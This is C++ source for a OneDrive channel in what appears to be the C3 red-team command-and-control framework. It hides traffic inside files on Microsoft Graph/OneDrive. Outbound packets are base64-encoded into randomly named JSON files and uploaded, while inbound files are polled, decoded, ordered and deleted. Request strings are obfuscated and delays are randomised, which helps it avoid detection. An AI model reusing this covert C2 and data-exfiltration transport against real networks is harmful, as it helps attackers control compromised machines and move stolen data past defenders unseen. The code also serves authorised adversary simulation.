#include "StdAfx.h"
#include "OneDrive365RestFile.h"
#include "Common/FSecure/Crypto/Base64.h"
#include "Common/FSecure/CppTools/ScopeGuard.h"
#include "Common/json/json.hpp"
#include "Common/FSecure/CppTools/StringConversions.h"
#include "Common/FSecure/WinHttp/HttpClient.h"
#include "Common/FSecure/WinHttp/Constants.h"
#include "Common/FSecure/WinHttp/Uri.h"

// Namespaces.
using json = nlohmann::json;
using base64 = cppcodec::base64_rfc4648;
using namespace FSecure::StringConversions;
using namespace FSecure::WinHttp;

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::Crypto::String FSecure::C3::Interfaces::Channels::OneDrive365RestFile::RootEndpoint = OBF("https://graph.microsoft.com/v1.0/me/drive/root:/");
FSecure::Crypto::String FSecure::C3::Interfaces::Channels::OneDrive365RestFile::ItemEndpoint = OBF("https://graph.microsoft.com/v1.0/me/drive/items/");
FSecure::Crypto::String FSecure::C3::Interfaces::Channels::OneDrive365RestFile::ListEndpoint = OBF("https://graph.microsoft.com/v1.0/me/drive/root/children");
FSecure::Crypto::String FSecure::C3::Interfaces::Channels::OneDrive365RestFile::TokenEndpoint = OBF("https://login.windows.net/organizations/oauth2/v2.0/token");
FSecure::Crypto::String FSecure::C3::Interfaces::Channels::OneDrive365RestFile::Scope = OBF("files.readwrite.all");

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
size_t FSecure::C3::Interfaces::Channels::OneDrive365RestFile::OnSendToChannel(ByteView data)
{
	RateLimitDelay(m_MinUpdateDelay, m_MaxUpdateDelay);

	try
	{
		// Construct the HTTP request
		auto URLwithFilename = RootEndpoint.Decrypt().c_str() + m_OutboundDirectionName + OBF("-") + FSecure::Utils::GenerateRandomString(20) + OBF(".json") + OBF(":/content");
		auto webClient = HttpClient{ Convert<Utf16>(URLwithFilename), m_ProxyConfig };
		auto request = CreateAuthRequest(Method::PUT);

		auto chunkSize = std::min<size_t>(data.size(), base64::decoded_max_size(4 * 1024 * 1024 - 256)); // Send max 4 MB. 256 bytes are reserved for json schema.
		auto fileData = json{};
		fileData[OBF("epoch_time")] = FSecure::Utils::TimeSinceEpoch();
		fileData[OBF("high_res_time")] = GetTickCount64();
		fileData[OBF("data")] = base64::encode(&data.front(), chunkSize);

		auto body = fileData.dump();
		request.SetData(ContentType::TextPlain, { body.begin(), body.end() });
		EvaluateResponse(webClient.Request(request));

		return chunkSize;
	}
	catch (std::exception& exception)
	{
		Log({ OBF_SEC("Caught a std::exception when running OnSend(): ") + exception.what(), LogMessage::Severity::Error });
		return 0u;
	}
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
std::vector<FSecure::ByteVector> FSecure::C3::Interfaces::Channels::OneDrive365RestFile::OnReceiveFromChannel()
{
	RateLimitDelay(m_MinUpdateDelay, m_MaxUpdateDelay);

	auto packets = std::vector<ByteVector>{};
	try
	{
		auto fileList = ListData(OBF("?top=1000&filter=startswith(name,'") + m_InboundDirectionName + OBF("')"));

		// First iterate over the json and populate an array of the files we want.
		auto elements = std::vector<json>{};
		for (auto& element : fileList.at(OBF("value")))
		{
			//download the file
			auto  webClientFile = HttpClient{ Convert<Utf16>(element.at(OBF("@microsoft.graph.downloadUrl")).get<std::string>()), m_ProxyConfig };
			auto request = CreateAuthRequest();
			auto resp = webClientFile.Request(request);
			EvaluateResponse(resp);

			auto j = json::parse(resp.GetData());
			j[OBF("id")] = element.at(OBF("id"));
			elements.push_back(std::move(j));
		}

		//now sort and re-iterate over them.
		std::sort(elements.begin(), elements.end(),
			[](auto const& a, auto const& b) { return a[OBF("epoch_time")] < b[OBF("epoch_time")] || a[OBF("high_res_time")] < b[OBF("high_res_time")]; }
		);

		for(auto &element : elements)
		{
			auto id = element.at(OBF("id")).get<std::string>();
			packets.push_back(base64::decode(element.at(OBF("data")).get<std::string>()));
			RemoveItem(id);
		}
	}
	catch (std::exception& exception)
	{
		Log({ OBF_SEC("Caught a std::exception when running OnReceive(): ") + exception.what(), LogMessage::Severity::Warning });
	}

	return packets;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::ByteVector FSecure::C3::Interfaces::Channels::OneDrive365RestFile::OnRunCommand(ByteView command)
{
	auto commandCopy = command; // Each read moves ByteView. CommandCoppy is needed  for default.
	switch (command.Read<uint16_t>())
	{
	case 0:
		try
		{
			RemoveAllItems();
		}
		catch (std::exception const& e)
		{
			Log({ OBF_SEC("Caught a std::exception when running RemoveAllFiles(): ") + e.what(), LogMessage::Severity::Error });
		}
		return {};
	default:
		return AbstractChannel::OnRunCommand(commandCopy);
	}
}
